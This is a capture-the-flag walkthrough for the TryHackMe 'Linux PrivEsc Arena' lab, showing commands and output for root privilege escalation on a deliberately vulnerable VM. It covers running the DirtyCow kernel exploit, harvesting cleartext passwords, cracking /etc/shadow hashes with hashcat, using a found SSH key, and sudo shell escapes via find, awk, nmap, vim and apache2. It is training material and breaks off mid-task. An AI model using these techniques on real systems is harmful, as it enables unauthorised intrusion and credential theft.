# Linux PrivEsc Arena

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
Tags: -
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. 
Your credentials are TCM:Hacker123
```

Room link: [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)

## Solution

### Task 1: Connecting to the TryHackMe network

You can either use the browser-based terminal (which appears when you deploy the machine), or you can connect to TryHackMe's network (via OpenVPN) and SSH in directly. If you've not done this before, first complete the [OpenVPN room](https://tryhackme.com/room/openvpn) and learn how to connect.

---------------------------------------------------------------------------------------

### Task 2: Deploy the vulnerable machine

This room will teach you a variety of Linux privilege escalation tactics, including kernel exploits, sudo attacks, SUID attacks, scheduled task attacks, and more. This lab was built utilizing Sagi Shahar's privesc workshop ([https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)) and utilized as part of The Cyber Mentor's Linux Privilege Escalation Udemy course ([http://udemy.com/course/linux-privilege-escalation-for-beginners](http://udemy.com/course/linux-privilege-escalation-for-beginners)).

All tools needed to complete this course are in the **user** folder (`/home/user/tools`).

Let's first connect to the machine. SSH is open on port 22. Your credentials are:

- **username**: `TCM`
- **password**: `Hacker123`

---------------------------------------------------------------------------------------

#### Deploy the machine and log into the user account via SSH (or use the browser-based terminal)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ export TARGET_IP=10.113.169.236

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ ssh TCM@$TARGET_IP                                                          
Unable to negotiate with 10.113.169.236 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa TCM@$TARGET_IP 
The authenticity of host '10.113.169.236 (10.113.169.236)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:164: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.113.169.236' (RSA) to the list of known hosts.
TCM@10.113.169.236's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 15 06:17:40 2026 from ip-10-113-119-118.eu-central-1.compute.internal
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 3: Kernel Exploits

#### Detection

Linux VM

1. In command prompt type: `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
2. From the output, notice that the OS is vulnerable to “dirtycow”.

#### Exploitation

Linux VM

1. In command prompt type: `gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w`
2. In command prompt type: `./c0w`

Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.

3. In command prompt type: `passwd`
4. In command prompt type: `id`

From here, either copy `/tmp/passwd` back to `/usr/bin/passwd` or reset your machine to undo changes made to the passwd binary

---------------------------------------------------------------------------------------

#### Enumerate with LES

```bash
TCM@debian:~$ cd tools
TCM@debian:~/tools$ ls -l
total 32
drwxr-xr-x 2 TCM user 4096 Jun 18  2020 dirtycow
drwxr-xr-x 2 TCM user 4096 May 15  2017 exim
drwxr-xr-x 2 TCM user 4096 Jun 18  2020 linenum
drwxr-xr-x 2 TCM user 4096 Jun 18  2020 linpeas
drwxr-xr-x 2 TCM user 4096 May 15  2017 linux-exploit-suggester
drwxr-xr-x 2 TCM user 4096 May 15  2017 nfsshell
drwxr-xr-x 2 TCM user 4096 May 15  2017 nginx
drwxr-xr-x 2 TCM user 4096 May 15  2017 source_files
TCM@debian:~/tools$ cd linux-exploit-suggester/
TCM@debian:~/tools/linux-exploit-suggester$ ls -l
total 40
-rwxr-xr-x 1 TCM user 38216 May 15  2017 linux-exploit-suggester.sh
TCM@debian:~/tools/linux-exploit-suggester$ ./linux-exploit-suggester.sh 

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Tags: debian=6,ubuntu=10.10|10.04|9.10,fedora=16
   Download URL: https://www.exploit-db.com/download/15285

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Tags: ubuntu=10.04|9.10
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Tags: ubuntu=9.10|10.04|10.10,ubuntu=10.04.1
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: ubuntu=12.04
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40616

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=16.04
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Tags: ubuntu=9.10|10.04
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0

TCM@debian:~/tools/linux-exploit-suggester$ 
```

Note that dirtycow / CVE-2016-5195 is among the listed exploits.

#### Compile the exploit

```bash
TCM@debian:~/tools/linux-exploit-suggester$ cd ..
TCM@debian:~/tools$ ls -l
total 32
drwxr-xr-x 2 TCM user 4096 Jun 18  2020 dirtycow
drwxr-xr-x 2 TCM user 4096 May 15  2017 exim
drwxr-xr-x 2 TCM user 4096 Jun 18  2020 linenum
drwxr-xr-x 2 TCM user 4096 Jun 18  2020 linpeas
drwxr-xr-x 2 TCM user 4096 May 15  2017 linux-exploit-suggester
drwxr-xr-x 2 TCM user 4096 May 15  2017 nfsshell
drwxr-xr-x 2 TCM user 4096 May 15  2017 nginx
drwxr-xr-x 2 TCM user 4096 May 15  2017 source_files
TCM@debian:~/tools$ cd dirtycow/
TCM@debian:~/tools/dirtycow$ ls -l
total 8
-rw-r--r-- 1 TCM user 4368 May 15  2017 c0w.c
TCM@debian:~/tools/dirtycow$ gcc -pthread -o c0w c0w.c 
TCM@debian:~/tools/dirtycow$ file c0w
c0w: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
TCM@debian:~/tools/dirtycow$ 
```

#### Run the exploit

```bash
TCM@debian:~/tools/dirtycow$ ./c0w 
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 26d99000

ptrace 0

TCM@debian:~/tools/dirtycow$ madvise 0


TCM@debian:~/tools/dirtycow$ 
```

Note that this takes **1-2 minutes to complete**!

#### Escalate your privileges

```bash
TCM@debian:~/tools/dirtycow$ passwd
root@debian:/home/user/tools/dirtycow# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

#### Restore passwd

```bash
root@debian:/home/user/tools/dirtycow# cp /tmp/bak /usr/bin/passwd   
root@debian:/home/user/tools/dirtycow# exit
exit
TCM@debian:~/tools/dirtycow$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~/tools/dirtycow$ 
```

---------------------------------------------------------------------------------------

### Task 4: Stored Passwords (Config Files)

#### Exploitation

Linux VM

1. In command prompt type: `cat /home/user/myvpn.ovpn`
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: `cat /etc/openvpn/auth.txt`
4. From the output, make note of the clear-text credentials.
5. In command prompt type: `cat /home/user/.irssi/config | grep -i passw`
6. From the output, make note of the clear-text credentials.

---------------------------------------------------------------------------------------

#### What password did you find?

```bash
TCM@debian:~$ ls -la
total 48
drwxr-xr-x  5 TCM  user 4096 Jun 18  2020 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user  801 Jun 18  2020 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Jun 18  2020 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
TCM@debian:~$ cat .irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
TCM@debian:~$ 
```

Answer: `password321`

#### What user's credentials were exposed in the OpenVPN auth file?

```bash
TCM@debian:~$ cat myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt 
user
password321
TCM@debian:~$ 
```

Answer: `user`

---------------------------------------------------------------------------------------

### Task 5: Stored Passwords (History)

#### Exploitation

Linux VM

1. In command prompt type: `cat ~/.bash_history | grep -i passw`
2. From the output, make note of the clear-text credentials.

---------------------------------------------------------------------------------------

#### What was TCM trying to log into?

```bash
TCM@debian:~$ ls -la
total 48
drwxr-xr-x  5 TCM  user 4096 Jun 18  2020 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user  801 Jun 18  2020 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Jun 18  2020 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
TCM@debian:~$ cat .bash_history 
ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
ls
cd tools/
mkdir linux-exploit-suggester
cd linux-exploit-suggester/
nano linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh 
cat /etc/issue
uname -a
cat /etc/lsb-release
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
cat /proc/version
uname -a
hostname
lscpu
cat /etc/profile
lpstat -a
cat /etc/issue
cat /proc/version 
ps aux
cat /etc/services 
ps aux | grep root
history
nano .bash_history
history 
ls
cd tools/
ls
cd linux-exploit-suggester/
ls
cd ..
mkdir linpeas
cd linpeas/
wget http://192.168.4.51/linpeas.sh
ls
chmod +x linpeas.sh 
ls
cd ..
mkdir linenum
cd linenum/
nano linenum.sh
chmod +x linenum.sh 
ls
cd ..
ls
TCM@debian:~$ 
```

Answer: `mysql`

#### Who was TCM trying to log in as?

```bash
TCM@debian:~$ cat .bash_history 
ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
<---snip--->
```

Answer: `root`

#### Naughty naughty.  What was the password discovered?

See output above.

Answer: `password123`

---------------------------------------------------------------------------------------

### Task 6: Weak File Permissions

#### Detection

Linux VM

1. In command prompt type: `ls -la /etc/shadow`
2. Note the file permissions

#### Exploitation

Linux VM

1. In command prompt type: `cat /etc/passwd`
2. Save the output to a file on your attacker machine
3. In command prompt type: `cat /etc/shadow`
4. Save the output to a file on your attacker machine

Attacker VM

1. In command prompt type: `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:

`hashcat -m 1800 unshadowed.txt rockyou.txt -O`

---------------------------------------------------------------------------------------

#### What were the file permissions on the /etc/shadow file?

```bash
TCM@debian:~$ ls -l /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
TCM@debian:~$ 
```

Answer: `-rw-rw-r--`

#### Try to crack the hashes

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ scp -oHostKeyAlgorithms=+ssh-rsa TCM@10.113.169.236:/etc/shadow shadow
TCM@10.113.169.236's password: 
shadow                                                                                                                                                          100%  809    16.1KB/s   00:00   

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ scp -oHostKeyAlgorithms=+ssh-rsa TCM@10.113.169.236:/etc/passwd passwd
TCM@10.113.169.236's password: 
passwd                                                                                                                                                          100%  950    19.3KB/s   00:00  

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ unshadow passwd shadow > unshadow.txt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ cat unshadow.txt                     
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:!:101:103::/var/spool/exim4:/bin/false
sshd:*:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:*:103:65534::/var/lib/nfs:/bin/false
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ hashcat -m 1800 -O unshadow.txt /usr/share/wordlists/rockyou.txt     
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashfile 'unshadow.txt' on line 2 (daemon:*:1:1:daemon:/usr/sbin:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 3 (bin:*:2:2:bin:/bin:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 4 (sys:*:3:3:sys:/dev:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 5 (sync:*:4:65534:sync:/bin:/bin/sync): Token length exception
Hashfile 'unshadow.txt' on line 6 (games:*:5:60:games:/usr/games:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 7 (man:*:6:12:man:/var/cache/man:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 8 (lp:*:7:7:lp:/var/spool/lpd:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 9 (mail:*:8:8:mail:/var/mail:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 10 (news:*:9:9:news:/var/spool/news:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 11 (uucp:*...:10:uucp:/var/spool/uucp:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 12 (proxy:*:13:13:proxy:/bin:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 13 (www-da...:33:33:www-data:/var/www:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 14 (backup...4:34:backup:/var/backups:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 15 (list:*...g List Manager:/var/list:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 16 (irc:*:39:39:ircd:/var/run/ircd:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 17 (gnats:...m (admin):/var/lib/gnats:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 18 (nobody...5534:nobody:/nonexistent:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 19 (libuui...00:101::/var/lib/libuuid:/bin/sh): Token length exception
Hashfile 'unshadow.txt' on line 20 (Debian...103::/var/spool/exim4:/bin/false): Token length exception
Hashfile 'unshadow.txt' on line 21 (sshd:*...:/var/run/sshd:/usr/sbin/nologin): Token length exception
Hashfile 'unshadow.txt' on line 22 (statd:...3:65534::/var/lib/nfs:/bin/false): Token length exception

* Token length exception: 21/23 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Uses-64-Bit

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: unshadow.txt
Time.Started.....: Sun Mar 15 12:14:16 2026 (1 min, 15 secs)
Time.Estimated...: Sun Mar 15 14:30:37 2026 (2 hours, 15 mins)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1754 H/s (6.67ms) @ Accel:512 Loops:128 Thr:1 Vec:4
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 252042/28688770 (0.88%)
Rejected.........: 138/252042 (0.05%)
Restore.Point....: 126021/14344385 (0.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1280-1408
Candidate.Engine.: Device Generator
Candidates.#1....: azul21 -> Hailey1
Hardware.Mon.#1..: Util: 93%

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q

                                                          
Session..........: hashcat
Status...........: Quit
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: unshadow.txt
Time.Started.....: Sun Mar 15 12:14:16 2026 (1 min, 21 secs)
Time.Estimated...: Sun Mar 15 14:30:15 2026 (2 hours, 14 mins)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1758 H/s (6.75ms) @ Accel:512 Loops:128 Thr:1 Vec:4
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 276644/28688770 (0.96%)
Rejected.........: 164/276644 (0.06%)
Restore.Point....: 138322/14344385 (0.96%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:896-1024
Candidate.Engine.: Device Generator
Candidates.#1....: mikha -> lola87
Hardware.Mon.#1..: Util: 90%

Started: Sun Mar 15 12:13:53 2026
Stopped: Sun Mar 15 12:15:39 2026
```

---------------------------------------------------------------------------------------

### Task 7: SSH Keys

#### Detection

Linux VM

1. In command prompt type: `find / -name authorized_keys 2> /dev/null`
2. In a command prompt type: `find / -name id_rsa 2> /dev/null`
3. Note the results.

#### Exploitation

Linux VM

1. Copy the contents of the discovered `id_rsa` file to a file on your attacker VM.

Attacker VM

1. In command prompt type: `chmod 400 id_rsa`
2. In command prompt type: `ssh -i id_rsa root@<ip>`

You should now have a root shell :)

---------------------------------------------------------------------------------------

#### What's the full file path of the sensitive file you discovered?

```bash
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$ 
```

Answer: `/backups/supersecretkeys/id_rsa`

---------------------------------------------------------------------------------------

### Task 8: Sudo (Shell Escaping)

#### Detection

Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

#### Exploitation

Linux VM

In command prompt type any of the following:

1. `sudo find /bin -name nano -exec /bin/sh \;`
2. `sudo awk 'BEGIN {system("/bin/sh")}'`
3. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
4. `sudo vim -c '!sh'`

---------------------------------------------------------------------------------------

#### Check for sudo access

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ 
```

#### PrivEsc via find

```bash
TCM@debian:~$ sudo find /bin -name nano -exec /bin/sh \;
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
TCM@debian:~$ 
```

#### PrivEsc via nmap

```bash
TCM@debian:~$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse

Starting Nmap 5.00 ( http://nmap.org ) at 2026-03-15 08:03 EDT
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
NSE: failed to initialize the script engine:
/usr/share/nmap/nse_main.lua:228: ./shell.nse is missing required field: 'categories'
stack traceback:
        [C]: in function 'error'
        /usr/share/nmap/nse_main.lua:228: in function 'new'
        /usr/share/nmap/nse_main.lua:392: in function 'get_chosen_scripts'
        /usr/share/nmap/nse_main.lua:594: in main chunk
        [C]: ?

QUITTING!
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 9: Sudo (Abusing Intended Functionality)

#### Detection

Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

#### Exploitation

Linux VM

1. In command prompt type: `sudo apache2 -f /etc/shadow`
2. From the output, copy the root hash.

Attacker VM

1. Open command prompt and type: `echo '[Pasted Root Hash]' > hash.txt`
2. In command prompt type: `john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
3. From the output, notice the cracked credentials.

---------------------------------------------------------------------------------------

#### Check for sudo access

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ 
```

#### Read hash from /etc/shadow file

```bash
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
TCM@debian:~$ 
```

#### Crack the hash

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ vi root.hash 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ cat root.hash   
